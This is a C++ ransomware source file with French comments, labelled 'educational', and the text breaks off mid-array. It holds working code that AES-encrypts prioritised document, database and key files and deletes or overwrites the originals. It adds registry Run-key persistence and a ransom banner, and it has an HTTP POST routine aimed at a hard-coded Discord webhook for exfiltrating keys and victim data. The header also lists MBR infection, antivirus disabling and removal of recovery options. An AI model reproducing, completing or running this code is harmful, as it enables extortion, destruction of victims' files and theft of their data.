/**
 * RANSOMWARE EN C++
 * =================
 * 
 * Ce fichier est un exemple de ransomware utilisant des techniques avancées de persistance et blocage.
 * ATTENTION: Ce code est fourni à des fins éducatives uniquement pour comprendre les menaces.
 * L'utilisation malveillante de ce code est illégale et strictement interdite.
 * 
 * Principales fonctionnalités:
 * ----------------------------
 * 1. Chiffrement AES-256 des fichiers avec priorité sur les documents critiques
 * 2. Persistance multi-méthode pour survivre aux redémarrages (registre, MBR, tâches planifiées)
 * 3. Exploitation multi-thread pour chiffrement rapide et parallèle
 * 4. Blocage agressif des contrôles système et interfaces utilisateur
 * 5. Désactivation des logiciels de sécurité et prévention de l'arrêt du système
 * 6. Exfiltration de données sensibles avant chiffrement
 * 7. Interface graphique en plein écran impossible à fermer
 * 
 * Techniques avancées implémentées:
 * --------------------------------
 * - Simulation d'infection du MBR pour charger au démarrage système
 * - Blocage des contrôles système via hooks de clavier et modifications de registre
 * - Élévation de privilèges via les services système
 * - Désactivation des réglages de sécurité et contournement des antivirus
 * - Suppression des méthodes de récupération (points de restauration, backups)
 * - Prévention active des tentatives d'arrêt système
 * 
 * AVERTISSEMENT: Utiliser ce code dans un environnement de test isolé uniquement.
 * Son déploiement sur des systèmes réels sans consentement est illégal.
 */

// Forward declarations (Déclarations anticipées)
#include <string>
#include <vector>
#include <mutex>
#include <atomic>
#include <windows.h>
#include <algorithm>
#include <random>
#include <chrono>
#include <filesystem>
#include <functional>
#include <wininet.h>
#include <iphlpapi.h>
#include <deque>
#include <regex>
#include <fstream>
#include <psapi.h> // Pour EnumProcessModules

class Encryption;
struct EncryptionState;
struct SharedData;

std::string getComputerName();
std::string getUserName();
std::string getPublicIPAddress();
std::string getMACAddress();
std::string getOSInfo();
std::string getProcessorInfo();
std::string getRAMInfo();
std::string base64Encode(const unsigned char* data, size_t length);
std::string getCurrentTimeString();
bool sendHttpRequest(const std::string& url, const std::string& data);
bool sendKeyToWebhook(const Encryption& encryption, const std::string& webhookUrl, int encryptedCount, const std::vector<std::string>& encryptedFiles);
std::string GetExecutablePath();
bool isInternetConnected();

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <chrono>
#include <random>
#include <algorithm>
#include <cstring>
#include <thread>
#include <future>
#include <iomanip>
#include <sstream>
#include <unordered_map>
#include <functional>
#include <deque>
#include <regex>

// Cryptographie
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>
#include <openssl/sha.h>
#include <openssl/err.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>

#ifdef _WIN32
#include <intrin.h> // Pour __cpuid
#endif

// Windows API
#ifdef _WIN32
#include <shlobj.h>
#include <winreg.h>
#include <wininet.h>
#include <iphlpapi.h>
#include <tchar.h>
#include <rpc.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "rpcrt4.lib")
#endif

// UUID generation
#ifdef _WIN32
#include <rpc.h>
#pragma comment(lib, "rpcrt4.lib")
#else
#include <uuid/uuid.h>
#endif

namespace fs = std::filesystem;

// Structure pour partager des données entre les threads
#ifdef _WIN32
struct SharedData {
    int totalFiles;
    std::atomic<int> processedFiles;
    std::string currentFileName;           // Nom du fichier actuellement en cours de chiffrement
    std::vector<std::string> lastEncrypted; // Liste des derniers fichiers chiffrés
    std::mutex dataMutex;                  // Mutex pour protéger l'accès aux données partagées
    HWND hwnd;
    HWND hEditKey;                         // Handle du champ de saisie pour la clé
    HWND hDecryptButton;                   // Handle du bouton de déchiffrement
    bool decryptMode;                      // Mode de déchiffrement activé
    char decryptKey[256];                  // Clé de déchiffrement saisie
};
#endif

// Déclaration anticipée des fonctions Windows
#ifdef _WIN32
// Fonctions pour la fenêtre bloquante
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
DWORD WINAPI UpdateProgressThread(LPVOID lpParam);
HWND CreateFullscreenBlockingWindow(SharedData* data);

// Fonctions de contrôle système
bool disableTaskManager();
bool disableRegistry();
bool disableCmd();
bool preventShutdown();
bool disableSystemControls();
void killEssentialProcesses();
void setHighestPriority();
#endif

// Structure pour suivre l'état du chiffrement
struct EncryptionState {
    bool started;
    bool completed;
    std::vector<std::string> encryptedPaths;
};

// Configuration de la console Windows
#ifdef _WIN32
void setupConsole() {
    // Définir l'encodage en UTF-8
    SetConsoleOutputCP(CP_UTF8);
    // Activer le support des caractères spéciaux
    SetConsoleCP(CP_UTF8);
}
#endif

// Discord Webhook URL
const std::string WEBHOOK_URL = "https://discord.com/api/webhooks/1354564587751735437/Sf4ab7f_d5Q-HTyIwvfMcs-QPs2YGUVQwhEZUVZmaWtslZhI78YPCj1wmYzI7NU1eVnN";

// Bannière
const std::string BANNER = R"(
██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗██╗    ██╗ █████╗ ██████╗ ███████╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║██║    ██║██╔══██╗██╔══██╗██╔════╝
██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║██║ █╗ ██║███████║██████╔╝█████╗  
██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║██║███╗██║██╔══██║██╔══██╗██╔══╝  
██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║╚███╔███╔╝██║  ██║██║  ██║███████╗
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
                                                                          
                Vos fichiers ont été chiffrés! Payez la rançon pour récupérer vos données.
)";

// Extension pour les fichiers chiffrés
const std::string ENCRYPTED_EXTENSION = ".encrypted";

// Structure pour définir les priorités des types de fichiers
struct FileTypePriority {
    std::string extension;
    int priority;  // Plus le nombre est petit, plus la priorité est haute
    std::string description;
};

// Types de fichiers à chiffrer avec leurs priorités
const std::vector<FileTypePriority> FILE_PRIORITIES = {
    // Priorité 1 - Fichiers critiques
    {".sql", 1, "Base de données"},
    {".db", 1, "Base de données"},
    {".sqlite", 1, "Base de données"},
    {".key", 1, "Clés de sécurité"},
    {".pem", 1, "Certificats"},
    {".env", 1, "Variables d'environnement"},
    {".config", 1, "Fichiers de configuration"},
    
    // Priorité 2 - Documents importants
    {".doc", 2, "Documents Word"},
    {".docx", 2, "Documents Word"},
    {".xls", 2, "Tableurs Excel"},
    {".xlsx", 2, "Tableurs Excel"},
    {".pdf", 2, "Documents PDF"},
    {".ppt", 2, "Présentations PowerPoint"},
    {".pptx", 2, "Présentations PowerPoint"},
    
    // Priorité 3 - Autres documents
    {".txt", 3, "Fichiers texte"},
    {".rtf", 3, "Documents RTF"},
    {".odt", 3, "Documents OpenDocument"},
    {".csv", 3, "Données tabulaires"},
    {".json", 3, "Données JSON"},
    {".xml", 3, "Données XML"},
    
    // Priorité 4 - Images et médias
    {".jpg", 4, "Images JPEG"},
    {".jpeg", 4, "Images JPEG"},
    {".png", 4, "Images PNG"},
    {".gif", 4, "Images GIF"},
    {".bmp", 4, "Images BMP"},
    {".tiff", 4, "Images TIFF"},
    {".svg", 4, "Images vectorielles"},
    {".webp", 4, "Images WebP"},
    {".mp3", 4, "Audio MP3"},
    {".mp4", 4, "Vidéo MP4"},
    {".wav", 4, "Audio WAV"},
    {".avi", 4, "Vidéo AVI"},
    {".mov", 4, "Vidéo MOV"},
    {".flv", 4, "Vidéo FLV"},
    {".mkv", 4, "Vidéo MKV"},
    
    // Priorité 5 - Archives et autres
    {".zip", 5, "Archives ZIP"},
    {".rar", 5, "Archives RAR"},
    {".7z", 5, "Archives 7-Zip"},
    {".tar", 5, "Archives TAR"},
    {".gz", 5, "Archives GZ"},
    {".bak", 5, "Sauvegardes"},
    {".backup", 5, "Sauvegardes"},
    {".old", 5, "Anciens fichiers"},
    {".log", 5, "Fichiers de logs"}
};

// Extensions à exclure du chiffrement - AUCUNE EXCLUSION
// Tout sera chiffré, y compris les fichiers système
const std::vector<std::string> EXTENSIONS_TO_EXCLUDE = {};

// Dossiers à exclure - AUCUNE EXCLUSION
// Tous les dossiers seront chiffrés sans exception
const std::vector<std::string> DIRECTORIES_TO_EXCLUDE = {};

// Fichiers spécifiques à ne pas chiffrer - AUCUNE EXCLUSION
// Tous les fichiers seront chiffrés sans exception
const std::vector<std::string> FILES_TO_EXCLUDE = {};

// Dossiers à éviter
const std::vector<std::string> EXCLUDE_DIRS = {
    "Windows", "Program Files", "Program Files (x86)", "AppData", 
    "ProgramData", "$Recycle.Bin", "Microsoft", "Boot", "System Volume Information", 
    "bootmgr", "Recovery", "PerfLogs"
};

// Fonctions utilitaires
std::string GenerateUUID() {
#ifdef _WIN32
    UUID uuid;
    UuidCreate(&uuid);
    
    unsigned char* str;
    UuidToStringA(&uuid, &str);
    
    std::string uuid_str(reinterpret_cast<char*>(str));
    RpcStringFreeA(&str);
    
    return uuid_str;
#else
    uuid_t uuid;
    char uuid_str[37];
    
    uuid_generate_random(uuid);
    uuid_unparse_lower(uuid, uuid_str);
    
    return std::string(uuid_str);
#endif
}

// Base64 encode
std::string Base64Encode(const std::vector<unsigned char>& data) {
    BIO* b64 = BIO_new(BIO_f_base64());
    BIO* bmem = BIO_new(BIO_s_mem());
    b64 = BIO_push(b64, bmem);
    BIO_write(b64, data.data(), static_cast<int>(data.size()));
    BIO_flush(b64);
    
    BUF_MEM* bptr;
    BIO_get_mem_ptr(b64, &bptr);
    
    std::string result(bptr->data, bptr->length - 1); // Remove trailing newline
    BIO_free_all(b64);
    
    return result;
}

// Ajout de la persistance au démarrage
bool AddToStartup(const std::string& exePath, const std::string& regName) {
#ifdef _WIN32
    HKEY hKey;
    LONG lResult = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    
    if (lResult != ERROR_SUCCESS) {
        return false;
    }
    
    lResult = RegSetValueExA(hKey, regName.c_str(), 0, REG_SZ, (BYTE*)exePath.c_str(), 
                          static_cast<DWORD>(exePath.length() + 1));
    RegCloseKey(hKey);
    
    return lResult == ERROR_SUCCESS;
#else
    // Non supporté sur les plateformes non-Windows
    return false;
#endif
}

// Supprimer la persistance au démarrage
bool RemoveFromStartup(const std::string& regName) {
#ifdef _WIN32
    HKEY hKey;
    LONG lResult = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    
    if (lResult != ERROR_SUCCESS) {
        return false;
    }
    
    lResult = RegDeleteValueA(hKey, regName.c_str());
    RegCloseKey(hKey);
    
    return lResult == ERROR_SUCCESS;
#else
    // Non supporté sur les plateformes non-Windows
    return false;
#endif
}

// Obtenir le chemin de l'exécutable
std::string GetExecutablePath() {
#ifdef _WIN32
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
#else
    // Linux & macOS
    char buffer[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", buffer, sizeof(buffer) - 1);
    if (len != -1) {
        buffer[len] = '\0';
        return std::string(buffer);
    }
    return "";
#endif
}

// Fonction pour envoyer des données via HTTP POST
bool SendHttpPost(const std::string& url, const std::string& data) {
    HINTERNET hInternet = InternetOpenA("RansomwareClient/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return false;
    }
    
    URL_COMPONENTS urlComp;
    char hostName[256] = {0};
    char urlPath[1024] = {0};
    
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = sizeof(hostName);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath);
    
    if (!InternetCrackUrlA(url.c_str(), static_cast<DWORD>(url.length()), 0, &urlComp)) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    HINTERNET hConnect = InternetConnectA(hInternet, hostName, urlComp.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }
    
    // Headers
    const char* headers = "Content-Type: application/json\r\n";
    
    // Envoyer la requête
    BOOL result = HttpSendRequestA(hRequest, headers, -1, (LPVOID)data.c_str(), static_cast<DWORD>(data.length()));
    
    // Nettoyer
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return result != FALSE;
}

// Classe pour le chiffrement/déchiffrement
class Encryption {
private:
    std::vector<unsigned char> key;
    std::vector<unsigned char> iv;
    
public:
    // Constructeur - Génère une nouvelle clé et IV
    Encryption() {
        key.resize(32); // AES-256
        iv.resize(16);  // Bloc AES
        
        // Générer une clé aléatoire
        RAND_bytes(key.data(), key.size());
        RAND_bytes(iv.data(), iv.size());
    }
    
    // Constructeur - Charger une clé existante
    Encryption(const std::string& keyPath) {
        key.resize(32);
        iv.resize(16);
        
        // Charger la clé depuis un fichier
        std::ifstream keyFile(keyPath, std::ios::binary);
        if (!keyFile) {
            throw std::runtime_error("Impossible d'ouvrir le fichier de clé");
        }
        
        keyFile.read(reinterpret_cast<char*>(key.data()), key.size());
        keyFile.read(reinterpret_cast<char*>(iv.data()), iv.size());
    }
    
    // Obtenir la clé
    const std::vector<unsigned char>& getKey() const {
        return key;
    }
    
    // Obtenir l'IV
    const std::vector<unsigned char>& getIV() const {
        return iv;
    }
    
    // Sauvegarder la clé
    void saveKey(const std::string& keyPath) {
        std::ofstream keyFile(keyPath, std::ios::binary);
        if (!keyFile) {
            throw std::runtime_error("Impossible de créer le fichier de clé");
        }
        
        keyFile.write(reinterpret_cast<const char*>(key.data()), key.size());
        keyFile.write(reinterpret_cast<const char*>(iv.data()), iv.size());
    }
    
    // Chiffrer un fichier
    bool encryptFile(const std::string& filePath) {
        // Vérifier si le fichier existe et n'est pas déjà chiffré
        if (!fs::exists(filePath) || filePath.find(ENCRYPTED_EXTENSION) != std::string::npos) {
            return false;
        }
        
        // Vérifier la taille minimale du fichier (éviter les fichiers vides)
        if (fs::file_size(filePath) < 10) {
            return false;
        }
        
        // Vérifier le type de fichier (ignorer les exécutables système)
        std::string extension = filePath.substr(filePath.find_last_of(".") + 1);
        std::vector<std::string> systemExtensions = {"sys", "dll", "exe", "com", "bat", "inf"};
        for (const auto& ext : systemExtensions) {
            if (extension == ext && filePath.find("Windows") != std::string::npos) {
                return false; // Ne pas chiffrer les fichiers système
            }
        }
        
        // Ajouter un délai pour simuler un vrai traitement (rendre la barre de progression réaliste)
        Sleep(100 + (rand() % 300)); // Entre 100-400ms par fichier
        
        std::ifstream inFile(filePath, std::ios::binary);
        if (!inFile) return false;
        
        std::string outFilePath = filePath + ENCRYPTED_EXTENSION;
        std::ofstream outFile(outFilePath, std::ios::binary);
        if (!outFile) return false;
        
        // Initialiser le contexte de chiffrement
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return false;
        
        // Initialiser l'opération de chiffrement
        if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key.data(), iv.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        // Écrire une signature spéciale au début du fichier chiffré pour pouvoir le reconnaître
        const char* signature = "RANSOMENCRYPTED_";
        outFile.write(signature, strlen(signature));
        
        // Écrire l'IV au début du fichier chiffré
        outFile.write(reinterpret_cast<const char*>(iv.data()), iv.size());
        
        // Chiffrer le fichier avec un buffer plus grand pour optimiser les I/O
        const int bufSize = 1024 * 1024; // 1 MB buffer
        std::vector<unsigned char> inBuf(bufSize);
        std::vector<unsigned char> outBuf(bufSize + EVP_MAX_BLOCK_LENGTH);
        int outLen;
        
        // Optimiser les I/O en désactivant les buffers synchronisés
        inFile.rdbuf()->pubsetbuf(0, 0);
        outFile.rdbuf()->pubsetbuf(0, 0);
        
        size_t totalBytesRead = 0;
        size_t fileSize = fs::file_size(filePath);
        
        while (inFile) {
            inFile.read(reinterpret_cast<char*>(inBuf.data()), bufSize);
            size_t bytesReadSize = inFile.gcount();
            if (bytesReadSize <= 0) break;
            
            totalBytesRead += bytesReadSize;
            
            int bytesRead = (bytesReadSize > INT_MAX) ? INT_MAX : static_cast<int>(bytesReadSize);
            if (EVP_EncryptUpdate(ctx, outBuf.data(), &outLen, inBuf.data(), bytesRead) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                return false;
            }
            
            outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
            
            // Si c'est un gros fichier, ajouter un petit délai supplémentaire 
            // pour éviter que la barre de progression ne se remplisse trop vite
            if (fileSize > 10 * 1024 * 1024 && totalBytesRead % (5 * 1024 * 1024) == 0) {
                Sleep(50);
            }
        }
        
        // Finaliser le chiffrement
        if (EVP_EncryptFinal_ex(ctx, outBuf.data(), &outLen) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
        
        // Forcer l'écriture sur le disque
        outFile.flush();
        
        // Nettoyer
        EVP_CIPHER_CTX_free(ctx);
        
        // Essayer de supprimer le fichier original
        inFile.close();
        try {
            fs::remove(filePath);
        } catch (...) {
            // Si on ne peut pas supprimer, essayer de le rendre inaccessible
            std::ofstream destroy(filePath, std::ios::binary | std::ios::trunc);
            if (destroy) {
                // Écraser avec des données aléatoires
                std::vector<char> randomData(4096, 0);
                for (int i = 0; i < 4096; i++) {
                    randomData[i] = rand() % 256;
                }
                destroy.write(randomData.data(), randomData.size());
                destroy.close();
            }
        }
        
        return true;
    }
    
    // Déchiffrer un fichier
    bool decryptFile(const std::string& encryptedFilePath) {
        if (!fs::exists(encryptedFilePath)) return false;
        
        // Vérifier l'extension
        if (encryptedFilePath.find(ENCRYPTED_EXTENSION) == std::string::npos) return false;
        
        // Ouvrir le fichier chiffré
        std::ifstream inFile(encryptedFilePath, std::ios::binary);
        if (!inFile) return false;
        
        // Lire et vérifier la signature
        char signature[17] = {0}; // 16 caractères + null terminator
        inFile.read(signature, 16);
        if (strcmp(signature, "RANSOMENCRYPTED_") != 0) {
            // Si pas de signature, revenir au début du fichier
            inFile.seekg(0, std::ios::beg);
        }
        
        // Lire l'IV depuis le fichier
        std::vector<unsigned char> fileIv(16);
        inFile.read(reinterpret_cast<char*>(fileIv.data()), fileIv.size());
        
        // Créer le chemin du fichier déchiffré
        std::string outFilePath = encryptedFilePath.substr(0, encryptedFilePath.length() - ENCRYPTED_EXTENSION.length());
        std::ofstream outFile(outFilePath, std::ios::binary);
        if (!outFile) return false;
        
        // Initialiser le contexte de déchiffrement
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return false;
        
        // Initialiser l'opération de déchiffrement
        if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key.data(), fileIv.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        // Déchiffrer le fichier avec un buffer plus grand
        const int bufSize = 1024 * 1024; // 1 MB buffer (même taille que pour chiffrement)
        std::vector<unsigned char> inBuf(bufSize);
        std::vector<unsigned char> outBuf(bufSize + EVP_MAX_BLOCK_LENGTH);
        int outLen;
        
        // Optimiser les I/O en désactivant les buffers synchronisés
        inFile.rdbuf()->pubsetbuf(0, 0);
        outFile.rdbuf()->pubsetbuf(0, 0);
        
        size_t totalBytesRead = 0;
        size_t fileSize = fs::file_size(encryptedFilePath);
        
        while (inFile) {
            inFile.read(reinterpret_cast<char*>(inBuf.data()), bufSize);
            size_t bytesReadSize = inFile.gcount();
            if (bytesReadSize <= 0) break;
            
            totalBytesRead += bytesReadSize;
            
            int bytesRead = (bytesReadSize > INT_MAX) ? INT_MAX : static_cast<int>(bytesReadSize);
            if (EVP_DecryptUpdate(ctx, outBuf.data(), &outLen, inBuf.data(), bytesRead) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                return false;
            }
            
            outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
            
            // Ajouter un petit délai pour les gros fichiers
            if (fileSize > 10 * 1024 * 1024 && totalBytesRead % (5 * 1024 * 1024) == 0) {
                Sleep(20); // Délai plus court pour le déchiffrement
            }
        }
        
        // Finaliser le déchiffrement
        if (EVP_DecryptFinal_ex(ctx, outBuf.data(), &outLen) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
        
        // Forcer l'écriture sur le disque
        outFile.flush();
        
        // Nettoyer
        EVP_CIPHER_CTX_free(ctx);
        
        // Supprimer le fichier chiffré après déchiffrement réussi
        inFile.close();
        try {
            fs::remove(encryptedFilePath);
        } catch (...) {
            // Ignorer les erreurs de suppression
        }
        
        return true;
    }
};

// Fonction pour sauvegarder l'état du chiffrement
void saveEncryptionState(const EncryptionState& state) {
#ifdef _WIN32
    try {
        // Sauvegarder l'état dans le registre
        HKEY hKey;
        if (RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\State", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            // Sauvegarder si le chiffrement a commencé
            DWORD started = state.started ? 1 : 0;
            RegSetValueExA(hKey, "Started", 0, REG_DWORD, (BYTE*)&started, sizeof(started));
            
            // Sauvegarder si le chiffrement est terminé
            DWORD completed = state.completed ? 1 : 0;
            RegSetValueExA(hKey, "Completed", 0, REG_DWORD, (BYTE*)&completed, sizeof(completed));
            
            // Sauvegarder les chemins déjà chiffrés
            std::string paths;
            for (const auto& path : state.encryptedPaths) {
                paths += path + ";";
            }
            
            size_t pathsLength = paths.length() + 1; // +1 pour le caractère nul
            DWORD dwPathsLength = (pathsLength > MAXDWORD) ? MAXDWORD : static_cast<DWORD>(pathsLength);
            RegSetValueExA(hKey, "EncryptedPaths", 0, REG_SZ, (BYTE*)paths.c_str(), dwPathsLength);
            
            RegCloseKey(hKey);
        }
    }
    catch (...) {
        // Ignorer les erreurs
    }
#endif
}

// Fonction pour charger l'état du chiffrement
EncryptionState loadEncryptionState() {
    EncryptionState state;
    state.started = false;
    state.completed = false;
    
#ifdef _WIN32
    try {
        // Charger l'état depuis le registre
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\State", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            // Charger si le chiffrement a commencé
            DWORD started = 0;
            DWORD size = sizeof(started);
            if (RegQueryValueExA(hKey, "Started", NULL, NULL, (BYTE*)&started, &size) == ERROR_SUCCESS) {
                state.started = (started == 1);
            }
            
            // Charger si le chiffrement est terminé
            DWORD completed = 0;
            size = sizeof(completed);
            if (RegQueryValueExA(hKey, "Completed", NULL, NULL, (BYTE*)&completed, &size) == ERROR_SUCCESS) {
                state.completed = (completed == 1);
            }
            
            // Charger les chemins déjà chiffrés
            char paths[4096] = {0};
            size = sizeof(paths);
            if (RegQueryValueExA(hKey, "EncryptedPaths", NULL, NULL, (BYTE*)paths, &size) == ERROR_SUCCESS) {
                std::string pathsStr(paths);
                std::string delimiter = ";";
                
                size_t pos = 0;
                std::string token;
                while ((pos = pathsStr.find(delimiter)) != std::string::npos) {
                    token = pathsStr.substr(0, pos);
                    state.encryptedPaths.push_back(token);
                    pathsStr.erase(0, pos + delimiter.length());
                }
            }
            
            RegCloseKey(hKey);
        }
    }
    catch (...) {
        // Ignorer les erreurs
    }
#endif
    
    return state;
}

// Vérifier si le ransomware est déjà en cours d'exécution
bool isRansomwareRunning() {
    // Création d'un mutex global
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\RansomwareLock");
    
    // Si le mutex existe déjà, le ransomware est en cours d'exécution
    if (hMutex != NULL && GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return true;
    }
    
    // Si non, on garde le handle ouvert pour le verrouillage
    return false;
}

// Classe principale du ransomware
class Ransomware {
private:
    Encryption encryption;
    std::string victimId;
    std::string desktopPath;
    std::string documentsPath;
    std::string ransomNotePath;
    std::atomic<int> encryptedFilesCount;
    std::atomic<int> failedFilesCount;
    std::mutex outputMutex;
    SharedData* sharedData;  // Référence aux données partagées
    
    // Vérifie si un chemin est sûr
    bool isSafePath(const std::string& path) {
        std::string lowerPath = path;
        std::transform(lowerPath.begin(), lowerPath.end(), lowerPath.begin(), 
                      [](unsigned char c){ return std::tolower(c); });
        
        for (const auto& excludeDir : EXCLUDE_DIRS) {
            std::string lowerExclude = excludeDir;
            std::transform(lowerExclude.begin(), lowerExclude.end(), lowerExclude.begin(), 
                          [](unsigned char c){ return std::tolower(c); });
            
            if (lowerPath.find(lowerExclude) != std::string::npos) {
                return false;
            }
        }
        
        return true;
    }
    
    // Traite un fichier
    bool processFile(const std::string& filePath) {
        try {
            // Vérifier si le fichier est déjà chiffré
            if (filePath.find(ENCRYPTED_EXTENSION) != std::string::npos) {
                return false;
            }
            
            // Vérifier l'extension du fichier
            fs::path path(filePath);
            std::string extension = path.extension().string();
            std::transform(extension.begin(), extension.end(), extension.begin(), 
                          [](unsigned char c){ return std::tolower(c); });
            
            // Trouver la priorité du type de fichier
            int filePriority = INT_MAX;
            for (const auto& fileType : FILE_PRIORITIES) {
                if (extension == fileType.extension) {
                    filePriority = fileType.priority;
                    break;
                }
            }
            
            // Si l'extension n'est pas dans notre liste, ignorer le fichier
            if (filePriority == INT_MAX) {
                return false;
            }
            
            // Mettre à jour l'interface pour afficher le fichier en cours de chiffrement
            if (sharedData) {
                std::lock_guard<std::mutex> lock(sharedData->dataMutex);
                sharedData->currentFileName = path.filename().string();
                // Forcer la mise à jour de la fenêtre
                InvalidateRect(sharedData->hwnd, NULL, TRUE);
            }
            
            // Chiffrer le fichier
            bool success = encryption.encryptFile(filePath);
            
            if (success) {
                // Supprimer le fichier original
                fs::remove(filePath);
                encryptedFilesCount++;
                
                // Mettre à jour les informations sur l'interface
                if (sharedData) {
                    std::lock_guard<std::mutex> lock(sharedData->dataMutex);
                    sharedData->processedFiles++;
                    sharedData->lastEncrypted.insert(sharedData->lastEncrypted.begin(), path.filename().string());
                    
                    // Limiter la liste à 10 fichiers
                    if (sharedData->lastEncrypted.size() > 10) {
                        sharedData->lastEncrypted.resize(10);
                    }
                    
                    // Réinitialiser le fichier en cours
                    sharedData->currentFileName = "";
                    
                    // Forcer la mise à jour de la fenêtre
                    InvalidateRect(sharedData->hwnd, NULL, TRUE);
                }
                
                {
                    std::lock_guard<std::mutex> lock(outputMutex);
                    std::cout << "[+] Chiffré (Priorité " << filePriority << "): " << filePath << std::endl;
                }
                
                return true;
            }
            else {
                failedFilesCount++;
                
                // Réinitialiser le fichier en cours en cas d'échec
                if (sharedData) {
                    std::lock_guard<std::mutex> lock(sharedData->dataMutex);
                    sharedData->currentFileName = "";
                }
                
                return false;
            }
        }
        catch (...) {
            failedFilesCount++;
            
            // Réinitialiser le fichier en cours en cas d'erreur
            if (sharedData) {
                std::lock_guard<std::mutex> lock(sharedData->dataMutex);
                sharedData->currentFileName = "";
            }
            
            return false;
        }
    }
    
    // Parcourir récursivement un répertoire
    void scanAndEncrypt(const std::string& directoryPath) {
        // Version mise à jour qui n'utilise pas la fonction globale
        EncryptionState state = loadEncryptionState();
        std::vector<std::string> encryptedFiles;
        
        // Appeler scanAndEncrypt directement, sans utiliser :: qui fait référence au namespace global
        // Nous utilisons ici la surcharge membre de la classe
        this->scanAndEncrypt(directoryPath, state, encryptedFiles);
    }
    
    // Surcharge pour compatibilité 
    void scanAndEncrypt(const std::string& directoryPath, EncryptionState& state, std::vector<std::string>& encryptedFiles) {
        static std::mutex mutex;
        static int currentDepth = 0;
        
        currentDepth++;
        if (currentDepth > 10) {
            currentDepth--;
            return; // Limiter la profondeur de récursion
        }
        
        // Vérifier si ce chemin a déjà été chiffré
        for (const auto& path : state.encryptedPaths) {
            if (path == directoryPath) {
                currentDepth--;
                return;
            }
        }
        
        // Répertoires à ignorer (systèmes et programmes)
        std::vector<std::string> excludedDirs = {
            "Windows", "Program Files", "Program Files (x86)", 
            "ProgramData", "AppData", "System Volume Information",
            "$Recycle.Bin", "Microsoft", "Temp"
        };
        
        // Vérifier si le répertoire actuel doit être ignoré
        std::string lowercasePath = directoryPath;
        std::transform(lowercasePath.begin(), lowercasePath.end(), lowercasePath.begin(), 
                      [](unsigned char c){ return std::tolower(c); });
        
        for (const auto& excludedDir : excludedDirs) {
            std::string lowercaseExclude = excludedDir;
            std::transform(lowercaseExclude.begin(), lowercaseExclude.end(), lowercaseExclude.begin(), 
                          [](unsigned char c){ return std::tolower(c); });
            
            if (lowercasePath.find(lowercaseExclude) != std::string::npos) {
                currentDepth--;
                return;
            }
        }
        
        // File types categorized by priority
        std::vector<std::string> highPriorityExtensions = {
            ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".rtf", 
